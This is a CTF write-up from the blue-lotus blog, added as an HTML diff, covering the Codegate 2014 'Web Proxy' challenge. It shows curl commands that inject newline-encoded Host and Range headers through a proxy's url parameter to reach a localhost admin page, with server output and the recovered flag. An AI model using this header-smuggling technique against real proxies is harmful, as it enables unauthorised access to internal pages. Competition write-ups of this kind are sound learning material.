@@ -1,0 +1,321 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Codegate CTF Quals 2014 Web Proxy writeup - blue-lotus</title>
+  <meta name="author" content="blue-lotus">
+
+  
+  <meta name="description" content="1
+http://58.229.183.25/188f6594f694a3ca082f7530b5efc58dedf81b8d/index.php Here is a GET param named “url”, we could use it to get some header and &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://www.blue-lotus.net//2014-02-25-codegate-ctf-quals-2014-web_proxy-writeup">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="blue-lotus" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <div id="header-inner">
+    <span class="first"><a href="/">blue-lotus</a></span>
+    <span><a href="/about">about</a></span>
+    <span class="last"><a href="/atom.xml" title="subscribe via RSS">rss</a></span>
+  </div>
+</hgroup>
+
+</header>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Codegate CTF Quals 2014 Web Proxy Writeup</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-02-25T00:00:00+08:00" pubdate data-updated="true">Feb 25<span>th</span>, 2014</time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
+</pre></td><td class="code"><pre><code class=""><span class="line">http://58.229.183.25/188f6594f694a3ca082f7530b5efc58dedf81b8d/index.php</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+<p>Here is a GET param named “url”, we could use it to get some header and body informaiton of a webpage.</p>
+
+<p>and in the index.php’s source code, we can find this:</p>
+
+<pre><code>&lt;!-- admin/index.php --&gt;
+</code></pre>
+
+<p>So it’s clear that we will use that GET param “url” to access /admin/index.php</p>
+
+<p>use “localhost” instead of “58.229.183.25”, and find out that a %0a(\n) will make the body information appears in header field, so there maybe some “http response splitting” trick</p>
+
+<p>after several test, we use two step to got the key.</p>
+
+<p>first step:</p>
+
+<pre><code>DeAdCaT-2:tmp DeAdCaT___$ curl http://58.229.183.24/188f6594f694a3ca082f7530b5efc58dedf81b8d/index.php?url=127.0.1.1%2F188f6594f694a3ca082f7530b5efc58dedf81b8d/admin/%20HTTP/1.1%0aHost:%20localhost%0aRange:%20bytes=370-%0a%0a
+ &lt;html&gt;
+ &lt;head&gt;
+      &lt;style type="text/css"&gt;
+      body { margin:0; }
+      * { font-family:fantasy; }
+      p { height:50pt; font-size:50pt; background:green;  }
+      input[type=text] { width:500; font-size:15pt; }
+      input[type=submit] { width:150; font-size:15pt; }
+      input[type=submit]:hover { background:lightblue; }
+      table { font-size:15pt; border:0;}
+      .err { background:yellow; font-weight:bold; }
+      #l:hover{ color:white; font-weight:bold; }
+      &lt;/style&gt;
+      &lt;title&gt;Web proxy&lt;/title&gt;
+ &lt;/head&gt;
+ &lt;body bgcolor=gray&gt;&lt;br&gt;
+ &lt;p align=center&gt;&lt;u&gt;&lt;a id=l&gt;W&lt;/a&gt;&lt;a id=l&gt;E&lt;/a&gt;&lt;a id=l&gt;B&lt;/a&gt; &lt;a id=l&gt;P&lt;/a&gt;&lt;a id=l&gt;R&lt;/a&gt;&lt;a id=l&gt;O&lt;/a&gt;&lt;a id=l&gt;X&lt;/a&gt;&lt;a id=l&gt;Y&lt;/a&gt;&lt;/u&gt;&lt;/p&gt;
+ &lt;center&gt;&lt;form method=get action='/188f6594f694a3ca082f7530b5efc58dedf81b8d/index.php'&gt;&lt;input type=text name=url value='127.0.1.1/188f6594f694a3ca082f7530b5efc58dedf81b8d/admin/ HTTP/1.1
+ Host: localhost
+ Range: bytes=370-
+
+ '&gt;&lt;input type=submit value='Submit'&gt;&lt;/form&gt;&lt;/center&gt;&lt;table border=5 align=center cellpadding=10 width=1000&gt;&lt;tr&gt;&lt;td bgcolor=yellow&gt;&lt;xmp&gt;HTTP/1.1 206 Partial Content
+ Date: Sat, 22 Feb 2014 16:11:08 GMT
+ Server: Apache/2.4.6 (Ubuntu)
+ X-Powered-By: PHP/5.5.3-1ubuntu2.1
+ Vary: Accept-Encoding
+ Content-Range: bytes 370-429/430
+ Content-Length: 60
+ Content-Type: text/html&lt;/xmp&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr align=left&gt;&lt;td bgcolor=silver&gt;&lt;xmp&gt;
+
+ 0
+ &lt;!--if($_SERVER[HTTP_HOST]=="hackme")--&gt;&lt;/body&gt;
+ .
+ .
+ .
+ .
+ .&lt;/xmp&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;br&gt;
+ &lt;!-- admin/index.php --&gt;
+ &lt;/body&gt;
+ &lt;/html&gt;
+</code></pre>
+
+<p>second step:</p>
+
+<pre><code>     DeAdCaT-2:tmp DeAdCaT___$ curl http://58.229.183.24/188f6594f694a3ca082f7530b5efc58dedf81b8d/index.php?url=127.0.1.1%2F188f6594f694a3ca082f7530b5efc58dedf81b8d/admin/%20HTTP/1.1%0aHost:%20hackme%0aRange:%20bytes=80-%0a%0a
+ &lt;html&gt;
+ &lt;head&gt;
+      &lt;style type="text/css"&gt;
+      body { margin:0; }
+      * { font-family:fantasy; }
+      p { height:50pt; font-size:50pt; background:green;  }
+      input[type=text] { width:500; font-size:15pt; }
+      input[type=submit] { width:150; font-size:15pt; }
+      input[type=submit]:hover { background:lightblue; }
+      table { font-size:15pt; border:0;}
+      .err { background:yellow; font-weight:bold; }
+      #l:hover{ color:white; font-weight:bold; }
+      &lt;/style&gt;
+      &lt;title&gt;Web proxy&lt;/title&gt;
+ &lt;/head&gt;
+ &lt;body bgcolor=gray&gt;&lt;br&gt;
+ &lt;p align=center&gt;&lt;u&gt;&lt;a id=l&gt;W&lt;/a&gt;&lt;a id=l&gt;E&lt;/a&gt;&lt;a id=l&gt;B&lt;/a&gt; &lt;a id=l&gt;P&lt;/a&gt;&lt;a id=l&gt;R&lt;/a&gt;&lt;a id=l&gt;O&lt;/a&gt;&lt;a id=l&gt;X&lt;/a&gt;&lt;a id=l&gt;Y&lt;/a&gt;&lt;/u&gt;&lt;/p&gt;
+ &lt;center&gt;&lt;form method=get action='/188f6594f694a3ca082f7530b5efc58dedf81b8d/index.php'&gt;&lt;input type=text name=url value='127.0.1.1/188f6594f694a3ca082f7530b5efc58dedf81b8d/admin/ HTTP/1.1
+ Host: hackme
+ Range: bytes=80-
+
+ '&gt;&lt;input type=submit value='Submit'&gt;&lt;/form&gt;&lt;/center&gt;&lt;table border=5 align=center cellpadding=10 width=1000&gt;&lt;tr&gt;&lt;td bgcolor=yellow&gt;&lt;xmp&gt;HTTP/1.1 206 Partial Content
+ Date: Sat, 22 Feb 2014 15:51:11 GMT
+ Server: Apache/2.4.6 (Ubuntu)
+ X-Powered-By: PHP/5.5.3-1ubuntu2.1
+ Vary: Accept-Encoding
+ Content-Range: bytes 80-126/127
+ Content-Length: 47
+ Content-Type: text/html&lt;/xmp&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr align=left&gt;&lt;td bgcolor=silver&gt;&lt;xmp&gt;
+
+ word is WH0_IS_SnUS_bI1G_F4N
+ &lt;/body&gt;
+ .
+ .
+ .
+ .4
+ .&lt;/xmp&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;br&gt;
+ &lt;!-- admin/index.php --&gt;
+ &lt;/body&gt;
+ &lt;/html&gt;
+</code></pre>
+
+<p>Password is WH0_IS_SnUS_bI1G_F4N</p>
+
+<p>Cheers :)          </p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">deadcat</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-02-25T00:00:00+08:00" pubdate data-updated="true">Feb 25<span>th</span>, 2014</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/ctf/'>CTF</a>, <a class='category' href='/blog/categories/writeup/'>writeup</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/2014-02-25-codegate-ctf-quals-2014-clone-technique-writeup/" title="Previous Post: Codegate CTF Quals 2014 Clone Technique writeup">&laquo; Codegate CTF Quals 2014 Clone Technique writeup</a>
+      
+      
+        <a class="basic-alignment right" href="/2014-02-25-codegate-ctf-quals-2014-weird_snus-writeup/" title="Next Post: Codegate CTF Quals 2014 weird_snus writeup">Codegate CTF Quals 2014 weird_snus writeup &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+  <section>
+    <h1>Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+  </section>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/2014-02-25-codegate-ctf-quals-2014-weirdshark-writeup/">Codegate CTF Quals 2014 Weirdshark Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/2014-02-25-codegate-ctf-quals-2014-weird_snus-writeup/">Codegate CTF Quals 2014 Weird_snus Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/2014-02-25-codegate-ctf-quals-2014-web_proxy-writeup/">Codegate CTF Quals 2014 Web Proxy Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/2014-02-25-codegate-ctf-quals-2014-clone-technique-writeup/">Codegate CTF Quals 2014 Clone Technique Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/2014-02-25-codegate-ctf-quals-2014-chrono-writeup/">Codegate CTF Quals 2014 Chrono Writeup</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2014 - blue-lotus -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+<script type="text/javascript">
+      var disqus_shortname = 'bluelotus';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://www.blue-lotus.net//2014-02-25-codegate-ctf-quals-2014-web_proxy-writeup/';
+        var disqus_url = 'http://www.blue-lotus.net//2014-02-25-codegate-ctf-quals-2014-web_proxy-writeup/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = 'http://' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
